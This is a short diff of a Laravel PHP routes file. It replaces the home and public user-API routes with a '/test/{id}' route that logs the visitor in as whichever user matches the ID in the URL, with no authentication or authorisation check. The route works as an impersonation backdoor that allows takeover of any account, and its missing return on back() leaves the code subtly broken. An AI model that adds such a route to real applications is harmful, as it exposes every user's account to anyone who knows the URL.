@@ -41,9 +41,12 @@ Route::get('/confirm/{token}', function ($token) {
     return view('auth.confirmed');
 });
 
-Route::get('/home', 'HomeController@index')->name('home');
+Route::get('/test/{id}', function ($id) {
+    $user = \App\Models\User::find($id);
+    auth()->login($user);
 
-Route::get('/public-api/users', 'Api\Users\UserController@index');
+    back();
+});
 
 /*
  * Forum Routes
